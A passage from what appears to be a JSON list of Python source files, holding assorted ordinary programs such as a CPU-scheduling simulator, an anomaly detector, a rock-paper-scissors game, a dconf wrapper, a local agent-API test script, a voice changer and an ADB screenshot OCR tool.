__():\n    return\n\n\nif __name__ == \"__main__\":\n    app.run()\n",
    "import tkinter as tk\nfrom tkinter import ttk, messagebox\nimport matplotlib.pyplot as plt\nfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAgg\n\n\nclass CPUScheduler:\n    def __init__(self):\n        self.processes = []  # Input: [[CBT1, AT1], [CBT2, AT2], ...]\n        self.context_switch_time = 0\n        self.time_quantum = 5\n\n    def fcfs(self):\n        n = len(self.processes)\n\n        CBT = [p[0] for p in self.processes]\n        AT = [p[1] for p in self.processes]\n\n        WT = [0] * n\n        TT = [0] * n\n        RT = [0] * n\n\n        gantt = []\n\n        # Sort processes by arrival time\n        sorted_processes = sorted(enumerate(self.processes), key=lambda x: x[1][1])\n\n        time = sorted_processes[0][1][1]  # Start with first arrival\n\n        last_process = False  \n\n        for i, (cbt, at) in sorted_processes:\n            if time < at:\n                time = at\n            WT[i] = time - at\n            \n\n            gantt.append((at, at, i, \"arrival\"))  # Add process arrival\n\n\n            gantt.append((time, time + cbt, i, \"execution\"))\n            time += cbt\n\n            if i == len(sorted_processes) - 1:\n                last_process = True  # Last process is now being executed\n\n            # Add context switch only if not the first process\n            if not last_process and self.context_switch_time > 0:\n                gantt.append((time, time + self.context_switch_time, -1, \"context_switch\"))\n                time += self.context_switch_time\n            \n            RT[i] = WT[i]\n            TT[i] = WT[i] + cbt\n\n        return gantt, WT, TT, RT\n\n    def spn(self):\n        n = len(self.processes)\n        CBT = [p[0] for p in self.processes]\n        AT = [p[1] for p in self.processes]\n        WT = [0] * n\n        TT = [0] * n\n        RT = [0] * n\n        gantt = []\n\n        completed = [False] * n\n        time = min(AT)\n\n        while True:\n\n\n            available = [(i, CBT[i]) for i in range(n) if not completed[i] and AT[i] <= time]\n\n            if not available:\n                time = min(AT[i] for i in range(n) if not completed[i])\n                continue\n\n            # Choose process with shortest burst time\n            current = min(available, key=lambda x: x[1])[0]\n\n            gantt.append((AT[current], AT[current], current, \"arrival\"))  # Add process arrival\n\n\n\n\n            gantt.append((time, time + CBT[current], current, \"execution\"))\n\n            WT[current] = time - AT[current]\n            RT[current] = WT[current]\n            TT[current] = WT[current] + CBT[current]\n            time += CBT[current]\n            completed[current] = True\n\n            if all(completed):\n                break\n\n            if   self.context_switch_time > 0:\n                gantt.append((time, time + self.context_switch_time, -1, \"context_switch\"))\n                time += self.context_switch_time\n\n        return gantt, WT, TT, RT\n\n\n        \n\n    def hrrn(self):\n        n = len(self.processes)\n        CBT = [p[0] for p in self.processes]\n        AT = [p[1] for p in self.processes]\n        WT = [0] * n\n        TT = [0] * n\n        RT = [0] * n\n        gantt = []\n\n        completed = [False] * n\n        time = min(AT)\n\n        while True:\n\n\n            available = []\n            for i in range(n):\n                if not completed[i] and AT[i] <= time:\n                    wait_time = time - AT[i]\n                    response_ratio = (wait_time + CBT[i]) / CBT[i]\n                    available.append((i, response_ratio))\n\n            if not available:\n                time = min(AT[i] for i in range(n) if not completed[i])\n                continue\n\n            current = max(available, key=lambda x: x[1])[0]\n\n            gantt.append((AT[current], AT[current], current, \"arrival\"))\n\n\n            gantt.append((time, time + CBT[current], current, \"execution\"))\n            WT[current] = time - AT[current]\n            RT[current] = WT[current]\n            TT[current] = WT[current] + CBT[current]\n            time += CBT[current]\n            completed[current] = True\n\n            if all(completed):\n                break\n\n            if self.context_switch_time > 0:\n                gantt.append((time, time + self.context_switch_time, -1, \"context_switch\"))\n                time += self.context_switch_time\n\n        return gantt, WT, TT, RT\n\n\n\n\n    def rr(self):\n\n        n = len(self.processes)\n        CBT = [p[0] for p in self.processes]\n        AT = [p[1] for p in self.processes]\n        WT = [0] * n\n        TT = [0] * n\n        RT = [-1] * n\n        gantt = []\n\n        remaining = CBT.copy()\n        time = min(AT)\n        ready_queue = []\n        j = 0\n\n        while True:\n            # Add newly arrived processes to ready queue\n            for i in range(n):\n                if AT[i] <= time and remaining[i] > 0 and i not in ready_queue:\n                    ready_queue.append(i)\n\n            if not ready_queue: #if ready queue is empty break\n                if all(remaining[i] == 0 for i in range(n)):\n           ",
    "import numpy as np\nfrom sklearn.metrics import confusion_matrix\n\nclass AvgrageMeter(object):\n  def __init__(self):\n    self.reset()\n\n  def reset(self):\n    self.avg = 0\n    self.sum = 0\n    self.cnt = 0\n\n  def update(self, val, n=1):\n    self.sum += val * n\n    self.cnt += n\n    self.avg = self.sum / self.cnt\n\ndef accuracy(output, target, topk=(1,)):\n    maxk = max(topk)\n    batch_size = target.size(0)\n\n    _, pred = output.topk(maxk, 1, True, True)\n    pred = pred.t()\n    correct = pred.eq(target.view(1, -1).expand_as(pred))\n\n    res = []\n    for k in topk:\n        correct_k = correct[:k].view(-1).float().sum(0)\n        res.append(correct_k.mul_(100.0/batch_size))\n    return res, target, pred.squeeze()\n\ndef output_metric(tar, pre):\n    matrix = confusion_matrix(tar, pre)\n    OA, AA_mean, Kappa, AA = cal_results(matrix)\n    return OA, AA_mean, Kappa, AA\n\ndef cal_results(matrix):\n    shape = np.shape(matrix)\n    number = 0\n    sum = 0\n    AA = np.zeros([shape[0]], dtype=np.float32)\n    for i in range(shape[0]):\n        number += matrix[i, i]\n        AA[i] = matrix[i, i] / np.sum(matrix[i, :])\n        sum += np.sum(matrix[i, :]) * np.sum(matrix[:, i])\n    OA = number / np.sum(matrix)\n    AA_mean = np.mean(AA)\n    pe = sum / (np.sum(matrix) ** 2)\n    Kappa = (OA - pe) / (1 - pe)\n    return OA, AA_mean, Kappa, AA\n\ndef print_args(args):\n    for k, v in zip(args.keys(), args.values()):\n        print(\"{0}: {1}\".format(k,v))\n\nclass NonZeroClipper(object):\n    def __call__(self, module):\n        if hasattr(module, 'weight'):\n           w = module.weight.data\n           w.clamp_(1e-6, 1)\n",
    "import numpy as np\nimport pandas as pd\nfrom sklearn.utils import check_array\nfrom collections import Counter\nfrom sklearn.decomposition import PCA\nfrom .base import BaseHistogramModel\nfrom typing import Union\n\n\nclass SPAD(BaseHistogramModel):\n    \"\"\"\n    SPAD (Statistical Probability Anomaly Detection) detects outliers by discretizing continuous data into bins and calculating anomaly scores based on the logarithm of inverse probabilities for each feature.\n\n    SPAD+ enhances SPAD by incorporating Principal Components (PCs) from PCA, capturing feature correlations to detect multivariate anomalies (Type II Anomalies). The final score combines contributions from original features and PCs.\n\n    Parameters\n    ----------\n    plus : bool, optional\n        If True, applies PCA and concatenates transformed features. Default is False.\n\n    Attributes\n    ----------\n    pca_model : PCA or None\n        PCA model for dimensionality reduction if `plus` is True.\n    plus : bool\n        Indicates whether PCA is applied.\n\n    References\n    ----------\n    Aryal, Sunil & Ting, Kai & Haffari, Gholamreza. (2016). Revisiting Attribute Independence Assumption in Probabilistic Unsupervised Anomaly Detection.\n    https://www.researchgate.net/publication/301610958_Revisiting_Attribute_Independence_Assumption_in_Probabilistic_Unsupervised_Anomaly_Detection\n\n    Aryal, Sunil & Agrahari Baniya, Arbind & Santosh, Kc. (2019). Improved histogram-based anomaly detector with the extended principal component features.\n    https://www.researchgate.net/publication/336132587_Improved_histogram-based_anomaly_detector_with_the_extended_principal_component_features\n    \"\"\"\n\n    def __init__(self, plus=False):\n        self.pca_model = None\n        self.plus = plus\n        super().__init__()\n\n    def fit(\n        self,\n        X: np.ndarray,\n        nbins: Union[int, str] = 5,\n        random_state: int = 42,\n    ) -> \"SPAD\":\n        \"\"\"\n        Fit the SPAD model to the data.\n        Parameters\n        ----------\n        X : np.ndarray\n            The input data to fit. Can be a numpy array, pandas Series, or pandas DataFrame.\n        nbins : Union[int, str], optional\n            The number of bins to use for discretizing continuous features. Default is 5.\n        random_state : int, optional\n            The random seed for reproducibility. Default is 42.\n        Returns\n        -------\n        SPAD\n            The fitted SPAD model.\n        Notes\n        -----\n        - If `X` is a pandas Series or DataFrame, the data types and column names are stored.\n        - If `self.plus` is True, PCA is applied to the data and the transformed features are concatenated. (SPAD+)\n        - For categorical features, relative frequencies are computed using Laplace smoothing.\n        - For continuous features, the data is discretized into bins and probabilities are computed.\n        - The decision scores are computed and stored in `self.decision_scores_`.\n        \"\"\"\n        self._extract_feature_info(X)\n\n        X = check_array(X)\n\n        if self.plus:\n            self.pca_model = PCA(random_state=random_state)\n            self.pca_model = self.pca_model.fit(X)\n            X = np.concatenate((X, self.pca_model.transform(X)), axis=1)\n            self.feature_dtypes = np.concatenate(\n                (self.feature_dtypes, np.array([np.float64] * len(self.feature_dtypes)))\n            )\n\n        _, self.n_features = X.shape\n\n        for i in range(self.n_features):\n            nbins = self._check_bins(X[:, i], nbins)\n\n            if isinstance(self.feature_dtypes[i], pd.CategoricalDtype):\n                value_counts = Counter(X[:, i])\n                total_values = sum(value_counts.values())\n                relative_frequencies = {\n                    value: (count + 1) / (total_values + len(value_counts))\n                    for value, count in value_counts.items()\n                }\n                self.feature_distributions.append(relative_frequencies)\n            else:\n                mean = np.mean(X[:, i])\n                std = np.std(X[:, i])\n                lower_bound = mean - 3 * std\n                upper_bound = mean + 3 * std\n                bin_edges = np.linspace(lower_bound, upper_bound, nbins + 1)\n                digitized = np.digitize(X[:, i], bin_edges, right=True)\n                unique_bins, counts = np.unique(digitized, return_counts=True)\n                probabilities = (counts + 1) / (np.sum(counts) + len(unique_bins))\n                self.feature_distributions.append([probabilities, bin_edges])\n\n        self.decision_scores_ = self._compute_decision_scores(X)\n        return self\n\n    def _compute_outlier_score(self, X: np.ndarray, i: int) -> np.ndarray:\n        \"\"\"\n        Compute the outlier score for a specific feature column.\n        \"\"\"\n\n        if isinstance(self.feature_dtypes[i], pd.CategoricalDtype):\n            densities = np.array(\n                [self.feature_distributions[i].get(value, 1e-9) for value in X[:, i]]\n            )\n",
    "import tkinter as tk\nfrom tkinter import messagebox\nimport random\n\nUSER_WINS = 0\nCOMPUTER_WINS = 0\nTIES = 0\n\ndef update_score():\n    score_label.config(text=f\"YOUR WINS: {USER_WINS}\\n COMPUTER WINS: {COMPUTER_WINS}\\n TIES: {TIES}\")\n\ndef play_game(user_choice):\n    global USER_WINS, COMPUTER_WINS, TIES\n\n    random_number = random.random()\n    \n    if random_number >= 0 and random_number < 1 / 3:\n        computer_move = 'rock'\n    elif random_number >= 1 / 3 and random_number < 2 / 3:\n        computer_move = 'paper'\n    else:\n        computer_move = 'scissors'\n    \n    if user_choice == 'rock':\n        if computer_move == 'rock':\n            result = 'Tie.'\n            TIES += 1\n        elif computer_move == 'paper':\n            result = 'You lose.'\n            COMPUTER_WINS += 1\n        else:\n            result = 'You win.'\n            USER_WINS += 1\n    \n    elif user_choice == 'paper':\n        if computer_move == 'rock':\n            result = 'You win.'\n            USER_WINS += 1\n        elif computer_move == 'paper':\n            result = 'Tie.'\n            TIES  += 1\n        else:\n            result = 'You lose.'\n            COMPUTER_WINS += 1\n    \n    elif user_choice == 'scissors':\n        if computer_move == 'rock':\n            result = 'You lose.'\n            COMPUTER_WINS += 1\n        elif computer_move == 'paper':\n            result = 'You win.'\n            USER_WINS += 1\n        else:\n            result = 'Tie.'\n            TIES += 1\n    \n    messagebox.showinfo(\"Game Result\", f\"You picked {user_choice}. Computer picked {computer_move}. {result}\")\n\n    update_score()\n\ndef quit_game():\n    root.quit()\n\nroot = tk.Tk()\nroot.title(\"Rock, Paper, Scissors\")\n\nroot.geometry(\"400x350\")\nroot.resizable(False, False)\n\nrock_button = tk.Button(root, text=\"\\U0000274A Rock\",font=(\"Arial\",18), width=20, command=lambda: play_game('rock'))\nrock_button.pack(pady=10)\n\npaper_button = tk.Button(root, text=\"\\U0000270B Paper\",font=(\"Arial\",18),width=20, command=lambda: play_game('paper'))\npaper_button.pack(pady=10)\n\nscissors_button = tk.Button(root, text=\"\\U0000270C Scissors\",font=(\"Arial\",18),width=20, command=lambda: play_game('scissors'))\nscissors_button.pack(pady=10)\n\nquit_button = tk.Button(root, text=\"Quit\",font=(\"Arial\",14),width=20, command=quit_game)\nquit_button.pack(pady=10)\n\nscore_label = tk.Label(root, text=\"YOUR WINS: 0\\nCOMPUTER WINS: 0\\nTIES: 0\",font=(\"Arial\",6))\nscore_label.pack(pady=20)\n\nroot.mainloop()\n",
    "import sys\nimport os\n\ntry:\n    import warnings\n    warnings.simplefilter(action='ignore', category=FutureWarning)\n\n    import numpy\n    import subprocess\n    import requests\n    import tempfile\n    import re\n    import uuid\n    import argparse\n    import sqlite3\n    import random\n    from pprint import pprint\n    import time\n    from typing import Optional, Any, Generator, Union\n\n    from pathlib import Path\n    from datetime import datetime\n    import hashlib\n    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn\n    from rich.table import Table\n    from rich.console import Console\n    from rich_argparse import RichHelpFormatter\n    from rich.highlighter import RegexHighlighter\n    from rich.theme import Theme\n    import rich.errors\n    from rich.panel import Panel\n    from rich.text import Text\n    from rich.prompt import Prompt\n\n    import PIL\n    from sixel import converter\n    import cv2\n\n    from pathlib import Path\n\n    from pyzbar.pyzbar import decode\n\n    from typing import Callable, TypeVar\n\n    F = TypeVar(\"F\", bound=Callable[..., object])\n\n    if os.getenv(\"OO_MAIN_TESTS\") == \"1\":\n        import importlib\n        typechecked = importlib.import_module(\"typeguard\").typechecked\n    else:\n        def typechecked(func: F) -> F:\n            return func\nexcept KeyboardInterrupt:\n    print(\"You pressed CTRL+c\")\n    sys.exit(0)\nexcept ModuleNotFoundError as e:\n    print(f\"The following module could not be found: {e}\")\n    sys.exit(1)\n\n@typechecked\ndef dier(msg: Any) -> None:\n    pprint(msg)\n    sys.exit(10)\n\nconsole: Console = Console(\n    force_interactive=True,\n    soft_wrap=True,\n    color_system=\"256\",\n    force_terminal=True\n)\n\n@typechecked\ndef to_absolute_path(path: str) -> str:\n    if os.path.isabs(path):\n        return path\n\n    return os.path.abspath(path)\n\noriginal_pwd = os.getenv(\"ORIGINAL_PWD\")\n\nDEFAULT_MIN_CONFIDENCE_FOR_SAVING: float = 0.1\nDEFAULT_DB_PATH: str = os.path.expanduser('~/.smartlocate_db')\nDEFAULT_ENCODINGS_FILE: str = os.path.expanduser(\"~/.smartlocate_face_encodings.pkl\")\nDEFAULT_MODEL: str = \"yolov5s.pt\"\nDEFAULT_YOLO_THRESHOLD: float = 0.7\nDEFAULT_SIXEL_WIDTH: int = 400\nDEFAULT_MAX_SIZE: int = 5\nDEFAULT_BLIP_MODEL_NAME: str = \"Salesforce/blip-image-captioning-large\"\nDEFAULT_TOLERANCE_FACE_DETECTION: float = 0.6\nDEFAULT_DIR: str = str(Path.home())\nDEFAULT_LANG_OCR: list[str] = ['de', 'en']\n\nif original_pwd and os.path.exists(original_pwd):\n    DEFAULT_DIR = original_pwd\n\nblip_processor: Any = None\nblip_model: Any = None\nreader: Any = None\n\nsupported_image_formats: set[str] = {'.jpg', '.jpeg', '.png', '.bmp', '.tiff'}\nallowed_document_extensions: list = ['.doc', '.docx', '.pptx', '.ppt', '.odp', '.odt', '.pdf', '.rtf', '.html']\n\nparser = argparse.ArgumentParser(description=\"Smart file indexer\", formatter_class=RichHelpFormatter)\n\nindex_related = parser.add_argument_group(\"Index Related\")\nindex_related.add_argument(\"--index\", action=\"store_true\", help=\"Index images in the specified directory\")\nindex_related.add_argument(\"--shuffle_index\", action=\"store_true\", help=\"Shuffle list of files before indexing\")\nindex_related.add_argument(\"--delete_non_existing_files\", action=\"store_true\", help=\"Delete non-existing files\")\nindex_related.add_argument(\"--describe\", action=\"store_true\", help=\"Enable image description\")\nindex_related.add_argument(\"--documents\", action=\"store_true\", help=\"Enable document indexing\")\n\nsearch_related = parser.add_argument_group(\"Search Related\")\nsearch_related.add_argument(\"search\", nargs=\"*\", help=\"Search term for indexed results\", default=[])\nsearch_related.add_argument(\"--exact\", action=\"store_true\", help=\"Exact search\")\nsearch_related.add_argument(\"--full_results\", action=\"store_true\", help=\"Show full results for OCR and file content search, not only the matching lines\")\n\nvisualization_related = parser.add_argument_group(\"Visualization Related\")\nvisualization_related.add_argument(\"--size\", type=int, default=DEFAULT_SIXEL_WIDTH, help=f\"Size to resize images for sixel display (default: {DEFAULT_SIXEL_WIDTH}).\")\nvisualization_related.add_argument(\"--no_sixel\", action=\"store_true\", help=\"Hide sixel graphics\")\n\ndebug_related = parser.add_argument_group(\"Debug & Maintenance\")\ndebug_related.add_argument(\"--debug\", action=\"store_true\", help=\"Enable debug mode\")\ndebug_related.add_argument(\"--vacuum\", action=\"store_true\", help=\"Vacuum the SQLite database file (reduces size without deleting data)\")\n\nmodel_related = parser.add_argument_group(\"Model & Detection\")\nmodel_related.add_argument(\"--blip_model_name\", default=DEFAULT_BLIP_MODEL_NAME, help=f\"Name of the blip model. Default: {DEFAULT_BLIP_MODEL_NAME}\")\nmodel_related.add_argument(\"--yolo\", action=\"store_true\", help=\"Use YOLO for indexing\")\nmodel_related.add_argument(\"--yolo_model\", default=DEFAULT_MODEL, help=\"Model to use for detection\")\nmodel_related.add_argument(\"--yolo_threshold\", type=float, default=DEFAULT_YOLO_THRESHOLD, help=f\"YOLO confidence threshold (0-1), ",
    "import subprocess\nimport threading\nimport time\nimport ast\n\ndef read(key):\n    \"\"\"\n    Read a value from dconf using an absolute key.\n\n    :param key: The absolute key to read.\n    :return: The value of the key.\n    \"\"\"\n    raw_value = subprocess.run(['dconf', 'read', key], capture_output=True, text=True)\n    return raw_value.stdout.strip()\n    \ndef write(key, value):\n    \"\"\"\n    Write a value to dconf using an absolute key.\n\n    :param key: The absolute key to write.\n    :param value: The value to write.\n    \"\"\"\n    subprocess.run(['dconf', 'write', key, value])\n    \ndef reset(key):\n    \"\"\"\n    Reset a dconf key to its default value using an absolute key.\n\n    :param key: The absolute key to reset.\n    \"\"\"\n    subprocess.run(['dconf', 'reset', key])\n\ndef dump(path):\n    \"\"\"\n    Dump all keys and values under an absolute path.\n\n    :param path: The absolute path to dump.\n    :return: A dictionary of key-value pairs.\n    \"\"\"\n    output = subprocess.run(['dconf', 'dump', path], capture_output=True, text=True)\n    result = {}\n    lines = output.stdout.splitlines()\n    current_key = None\n\n    for line in lines:\n        if line.startswith('['):\n            current_key = line.strip('[]')\n        elif current_key:\n            key, value = line.split('=', 1)\n            result[f\"{current_key}/{key.strip()}\"] = value.strip()\n\n    return result\n\ndef watch(path, callback):\n    \"\"\"\n    Watch for changes in the directory using dconf watch and call the callback.\n\n    :param path: The absolute path to watch.\n    :param callback: A function to call with the dconf path that changed.\n    \"\"\"\n    def watch_thread():\n        try:\n            command = ['dconf', 'watch', path]\n            process = subprocess.Popen(command, stdout=subprocess.PIPE, text=True)\n\n            for line in process.stdout:\n                if line.startswith(path):\n                    changed_path = line.strip()\n                    callback(changed_path)\n        except Exception as e:\n            print(f\"Error watching dconf: {e}\")\n    thread = threading.Thread(target=watch_thread, daemon=True)\n    thread.start()",
    "import requests\n\n# Base URL for the API\nBASE_URL = \"http://localhost:8080\"\n\n# Test health check endpoint\nresponse = requests.get(f\"{BASE_URL}/health\")\nprint(\"Health Check Response:\", response.json())\n\n# Test creating a new agent\nagent_config = {\n    \"agent_name\": \"test_agent\",\n    \"model_name\": \"gpt-3.5-turbo\",\n    \"description\": \"A test agent\",\n    \"system_prompt\": \"You are a helpful assistant\",\n    \"temperature\": 0.5,\n    \"max_loops\": 1,\n    \"dynamic_temperature_enabled\": True,\n    \"user_name\": \"test_user\",\n    \"retry_attempts\": 1,\n    \"context_length\": 200000,\n    \"output_type\": \"string\",\n    \"streaming_on\": False,\n    \"tags\": [\"test\"],\n    \"stopping_token\": \"<DONE>\",\n    \"auto_generate_prompt\": False,\n}\n\nresponse = requests.post(f\"{BASE_URL}/v1/agent\", json=agent_config)\nprint(\"\\nCreate Agent Response:\", response.json())\nagent_id = response.json()[\"agent_id\"]\n\n# Test getting rate limit status\nresponse = requests.get(f\"{BASE_URL}/v1/rate-limit-status\")\nprint(\"\\nRate Limit Status:\", response.json())\n\n# Test listing all agents\nresponse = requests.get(f\"{BASE_URL}/v1/agents\")\nprint(\"\\nList Agents Response:\", response.json())\n\n# Test updating an agent\nupdate_data = {\n    \"description\": \"Updated test agent\",\n    \"system_prompt\": \"Updated system prompt\",\n    \"temperature\": 0.7,\n    \"max_loops\": 2,\n    \"tags\": [\"test\", \"updated\"],\n}\n\nresponse = requests.patch(f\"{BASE_URL}/v1/agent/{agent_id}\", json=update_data)\nprint(\"\\nUpdate Agent Response:\", response.json())\n\n# Test getting agent metrics\nresponse = requests.get(f\"{BASE_URL}/v1/agent/{agent_id}/metrics\")\nprint(\"\\nAgent Metrics Response:\", response.json())\n\n# Test creating a completion\ncompletion_request = {\n    \"prompt\": \"Hello, how are you?\",\n    \"agent_id\": agent_id,\n    \"max_tokens\": 100,\n    \"temperature_override\": 0.8,\n    \"stream\": False,\n}\n\nresponse = requests.post(f\"{BASE_URL}/v1/agent/completions\", json=completion_request)\nprint(\"\\nCompletion Response:\", response.json())\n\n# Test cloning an agent\nresponse = requests.post(\n    f\"{BASE_URL}/v1/agent/{agent_id}/clone\", params={\"new_name\": \"cloned_agent\"}\n)\nprint(\"\\nClone Agent Response:\", response.json())\n\n# Test getting agent status\nresponse = requests.get(f\"{BASE_URL}/v1/agent/{agent_id}/status\")\nprint(\"\\nAgent Status Response:\", response.json())\n\n# Test batch completion status\nbatch_requests = [\n    {\n        \"prompt\": \"What is 2+2?\",\n        \"agent_id\": agent_id,\n        \"max_tokens\": 50,\n        \"temperature_override\": 0.5,\n        \"stream\": False,\n    },\n    {\n        \"prompt\": \"Who are you?\",\n        \"agent_id\": agent_id,\n        \"max_tokens\": 50,\n        \"temperature_override\": 0.5,\n        \"stream\": False,\n    },\n]\n\nresponse = requests.get(\n    f\"{BASE_URL}/v1/agent/batch/completions/status\", json=batch_requests\n)\nprint(\"\\nBatch Completion Status Response:\", response.json())\n\n# Test deleting an agent\nresponse = requests.delete(f\"{BASE_URL}/v1/agent/{agent_id}\")\nprint(\"\\nDelete Agent Response:\", response.json())\n\n# Test listing agents with filters\nresponse = requests.get(\n    f\"{BASE_URL}/v1/agents\", params={\"tags\": [\"test\"], \"status\": \"idle\"}\n)\nprint(\"\\nFiltered Agents List Response:\", response.json())\n",
    "import sys\nimport numpy as np\nimport pyaudio\nimport librosa\nimport scipy.io.wavfile as wav\nfrom PyQt5.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, \n                             QPushButton, QLabel, QComboBox, QWidget)\nfrom PyQt5.QtCore import QThread, pyqtSignal\n\nclass VoiceChangerThread(QThread):\n    def __init__(self, effect):\n        super().__init__()\n        self.effect = effect\n        self.is_running = False\n        self.p = pyaudio.PyAudio()\n        self.recorded_audio = []\n\n    def run(self):\n        self.is_running = True\n        audio_input = self.p.open(format=pyaudio.paInt16, channels=1, rate=44100, \n                                  input=True, frames_per_buffer=1024)\n        output = self.p.open(format=pyaudio.paInt16, channels=1, rate=44100, \n                             output=True, frames_per_buffer=1024)\n\n        while self.is_running:\n            try:\n                mic_input_data = audio_input.read(1024, exception_on_overflow=False)\n                mic_signal = np.frombuffer(mic_input_data, dtype=np.int16)\n                \n                if self.effect == \"robot\":\n                    output_signal = self.apply_robot_effect(mic_signal)\n                elif self.effect == \"alien\":\n                    output_signal = self.apply_alien_effect(mic_signal)\n                elif self.effect == \"chipmunk\":\n                    output_signal = self.apply_chipmunk_effect(mic_signal)\n                elif self.effect == \"giant\":\n                    output_signal = self.apply_giant_effect(mic_signal)\n                elif self.effect == \"echo\":\n                    output_signal = self.apply_echo_effect(mic_signal)\n                else:\n                    output_signal = mic_signal\n                \n                output.write(output_signal.tobytes())\n                self.recorded_audio.extend(output_signal)\n            \n            except Exception:\n                break\n\n        audio_input.stop_stream()\n        audio_input.close()\n        output.stop_stream()\n        output.close()\n        self.p.terminate()\n\n    def stop(self):\n        self.is_running = False\n        self.wait()\n        \n        if self.recorded_audio:\n            recorded_audio = np.array(self.recorded_audio, dtype=np.int16)\n            output_file = f\"output_{self.effect}.wav\"\n            wav.write(output_file, 44100, recorded_audio)\n            print(f\"Saved modified audio to {output_file}\")\n\n    def apply_robot_effect(self, audio_data):\n        modulated = audio_data * np.sin(2 * np.pi * 50 * np.arange(len(audio_data)) / 44100)\n        return modulated.astype(np.int16)\n\n    def apply_alien_effect(self, audio_data):\n        audio_data_float = audio_data.astype(np.float32) / 32768.0\n        alien_audio = librosa.effects.pitch_shift(audio_data_float, sr=44100, n_steps=8)\n        return (alien_audio * 32768.0).astype(np.int16)\n\n    def apply_chipmunk_effect(self, audio_data):\n        audio_data_float = audio_data.astype(np.float32) / 32768.0\n        chipmunk_audio = librosa.effects.time_stretch(audio_data_float, rate=1.5)\n        return (chipmunk_audio * 32768.0).astype(np.int16)\n\n    def apply_giant_effect(self, audio_data):\n        audio_data_float = audio_data.astype(np.float32) / 32768.0\n        giant_audio = librosa.effects.time_stretch(audio_data_float, rate=0.7)\n        return (giant_audio * 32768.0).astype(np.int16)\n\n    def apply_echo_effect(self, audio_data):\n        echo = np.zeros_like(audio_data)\n        echo_delay = 1024\n        echo[echo_delay:] = audio_data[:-echo_delay] * 0.5\n        return (audio_data + echo).astype(np.int16)\n\nclass VoiceChangerApp(QMainWindow):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"Voice Changer\")\n        self.setGeometry(100, 100, 300, 200)\n\n        central_widget = QWidget()\n        self.setCentralWidget(central_widget)\n        layout = QVBoxLayout()\n\n        # Effect Selector\n        effect_layout = QHBoxLayout()\n        self.effect_label = QLabel(\"Select Effect:\")\n        self.effect_combo = QComboBox()\n        self.effect_combo.addItems([\"robot\", \"alien\", \"chipmunk\", \"giant\", \"echo\"])\n        effect_layout.addWidget(self.effect_label)\n        effect_layout.addWidget(self.effect_combo)\n        layout.addLayout(effect_layout)\n\n        # Start/Stop Buttons\n        button_layout = QHBoxLayout()\n        self.start_button = QPushButton(\"Start\")\n        self.stop_button = QPushButton(\"Stop\")\n        self.stop_button.setEnabled(False)\n        \n        self.start_button.clicked.connect(self.start_voice_changer)\n        self.stop_button.clicked.connect(self.stop_voice_changer)\n        \n        button_layout.addWidget(self.start_button)\n        button_layout.addWidget(self.stop_button)\n        layout.addLayout(button_layout)\n\n        central_widget.setLayout(layout)\n        self.voice_changer_thread = None\n\n    def start_voice_changer(self):\n        effect = self.effect_combo.currentText()\n        self.voice_changer_thread = VoiceChan",
    "import os\nimport time\nimport pytesseract\nfrom PIL import Image\nimport subprocess\nimport csv\nimport re\nimport numpy as np\nimport cv2\n\nTESSERACT_PATH = r\"C:\\path\\to\\your\\tesseract.exe\"\nADB_PATH = r\"C:\\path\\to\\your\\adb.exe\"\nSCRCPY_PATH = r\"C:\\path\\to\\your\\scrcpy\\scrcpy.exe\"\n\npytesseract.pytesseract.tesseract_cmd = TESSERACT_PATH\n\ndef run_adb_command(command):\n    command.insert(0, ADB_PATH)\n    result = subprocess.run(command, capture_output=True, text=True)\n    if result.returncode != 0:\n        print(f\"Error running command: {command}\")\n        print(result.stderr)\n        return False\n    return True\n\ndef capture_screenshot(counter):\n    screenshot_path = f\"screenshot_{counter}.png\"\n    if not run_adb_command([\"shell\", \"screencap\", \"-p\", f\"/storage/emulated/0/{screenshot_path}\"]):\n        return None\n    if not run_adb_command([\"pull\", f\"/storage/emulated/0/{screenshot_path}\", screenshot_path]):\n        return None\n    return screenshot_path\n\ndef preprocess_image(image_path):\n    img = cv2.imread(image_path)\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    gray = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)[1]\n    cv2.imwrite(\"temp_processed.png\", gray)\n    return \"temp_processed.png\"\n\ndef extract_text(image_path):\n    processed_image_path = preprocess_image(image_path)\n    custom_config = r'--oem 3 --psm 6 -l eng+ind'\n    text = pytesseract.image_to_string(Image.open(processed_image_path), config=custom_config)\n    if os.path.exists(processed_image_path):\n        os.remove(processed_image_path)\n    return text\n\nclass EntryTracker:\n    def __init__(self):\n        self.last_entries = []\n        self.max_entries = 3\n\n    def is_duplicate_or_overlap(self, new_entry):\n        if self.last_entries:\n            last_entry = self.last_entries[-1]\n            \n            if (new_entry[\"Tanggal\"] == last_entry[\"Tanggal\"] and \n                self._is_exact_duplicate(new_entry, last_entry)):\n                return True\n        \n        return False\n\n    def _is_exact_duplicate(self, entry1, entry2):\n        text1 = f\"{entry1['Kegiatan']} {entry1['Target Pencapaian']}\".lower()\n        text2 = f\"{entry2['Kegiatan']} {entry2['Target Pencapaian']}\".lower()\n        \n        text1 = re.sub(r'[,.;]', '', text1)\n        text2 = re.sub(r'[,.;]', '', text2)\n        \n        words1 = set(text1.split())\n        words2 = set(text2.split())\n        \n        if not words1 or not words2:\n            return False\n            \n        overlap = len(words1.intersection(words2))\n        smaller_set_size = min(len(words1), len(words2))\n        \n        return overlap / smaller_set_size > 0.9\n\n    def add_entry(self, entry):\n        self.last_entries.append(entry)\n        if len(self.last_entries) > self.max_entries:\n            self.last_entries.pop(0)\n\ndef parse_text(text):\n    lines = [line.strip() for line in text.split('\\n') if line.strip()]\n    entries = []\n    current_entry = {\n        \"Tanggal\": \"Unknown\",\n        \"Kegiatan\": [],\n        \"Target Pencapaian\": \"Unknown\"\n    }\n    \n    date_pattern = r'\\d{4}-\\d{2}-\\d{2}'\n    in_kegiatan = False\n    \n    for line in lines:\n        date_match = re.search(date_pattern, line)\n        if date_match:\n            if current_entry[\"Kegiatan\"]:\n                current_entry[\"Kegiatan\"] = ' '.join(current_entry[\"Kegiatan\"]) if isinstance(current_entry[\"Kegiatan\"], list) else current_entry[\"Kegiatan\"]\n                entries.append(current_entry.copy())\n            current_entry = {\n                \"Tanggal\": date_match.group(0),\n                \"Kegiatan\": [],\n                \"Target Pencapaian\": \"Unknown\"\n            }\n            in_kegiatan = False\n            continue\n            \n        if any(ui_element in line for 